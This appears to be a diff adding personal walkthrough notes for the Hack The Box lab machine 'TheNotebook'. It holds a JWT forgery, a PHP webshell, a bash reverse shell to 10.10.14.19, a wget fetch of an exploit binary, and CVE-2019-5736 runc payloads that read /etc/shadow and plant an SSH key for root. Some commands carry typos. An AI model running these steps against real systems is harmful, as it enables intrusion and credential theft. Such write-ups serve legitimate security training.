@@ -1,0 +1,75 @@
+HTB - TheNotebook
+
+=== RECON ===
+Nmap
+$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.230
+$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.230 -> based on OpenSSH and Apache versions, host is likely Ubuntu 18.04 Bionic
+
+Website - TCP 80
+- Note taking application
+- Log in link leads to /login -> enumerate users
+- /register allows user creation
+$ feroxbuster -u http://10.10.10.230 -> directory brute forcer
+$ curl -v http://10.10.230/admin -> 403 forbidden
+- Two Set-Cookie headers -> auth cookie looks like JWT eyJ0eXAiOi... -> throw at jwt.io -> data gives user, pw, admin flag, port info
+- Hitting port 7070 to get private key
+
+=== SHELL AS WWW-DATA ===
+Gain Admin Access
+$ openssl genrsa -out priv.key 2048 -> generate RSA private key
+- Generate JWT token that uses private key by pointing kid at server
+- Firefox dev tools -> storage -> replace auth key with generated one -> refresh /admin -> can view all notes
+
+Enumeration as Admin
+- Two hints in notes from admin
+    - PHP files are executed
+    - Server has regular backups scheduled
+- Upload file link -> changes filename but not extension -> view link is broken for test.txt
+
+Webshell Execution
+- Upload PHP webshell
+<?php system($_REQUEST["cmd"]); ?>
+- View link does work -> add ?cmd=id to end of URL -> execution
+$ curl --data-urlencode 'cmd=id' -G -s http://10.10.10.230/a1b...90a.php
+
+Shell
+$ curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tc[/10.10.14.19/443 0>&1'" -G -s http://10.10.10.230/a1b...90a.php
+$ nc -lnvp 443 -> reverse shell
+> script /dev/null -c bash -> ^Z -> stty raw -echo: fg -> upgraded shell
+
+=== SHELL AS NOAH ===
+Enumeration
+- Dropped into ~/html -> /var/www/html -> only file is webshell
+> ifconfig -> docker network
+- Only home directory is noah -> no access as www-data
+- Files in /var/backups are owned by root but world readable -> home.tar.gz looks interesting
+> tar -tvf home.tar.gz -> private key in .ssh
+> tar -xf home.tar.gz -O /home/noah/.ssh/id_rsa
+
+SSH
+$ ssh -i ~/keys/thenotebook_noah noah@10.10.10.230
+> cat user.txt -> USER FLAG
+
+=== SHELL AS ROOT ===
+Enumeration
+> sudo -l -> noah can run docker as root with specific set of containers
+> docker -v -> version 18.06.0-ce
+
+CVE-2019-5736
+- Vuln in runc used by docker before 18.09.2 -> attacker can overwrite host runc binary from access as root inside container -> gives host root access
+    - From container -> overwrite /bin/sh with #!/proc/self/exe -> symbolic link to binary that started container process -> point runc at payload
+    - When container is initiated -> payload executed
+- Payload (Go script)
+var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadpw && chmod 777 /tmp/shadow"
+var payload = "#!/bin/bash \n mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3Nz...G3d.nobody@nothing' > /root/.ssh/authorized_keys"
+$ go build cve-2019-5673.go
+- Need two shells on TheNotebook as noah
+- First SSH
+    > sudo docker exec -it webapp-dev01 bash
+    # wget 10.10.14.19/cve-2019-5673
+    # chmod +x cve-2019-5673
+    # ./cve-2019-5673
+- Second SSH
+    > sudo docker exec -it webapp-dev01 /bin/sh -> error but more prints in first SSH and SSH key is written to root's authorized_keys
+$ ssh -i ~/keys/ed25519_gen root@10.10.10.230
+> cat root.txt -> ROOT FLAG
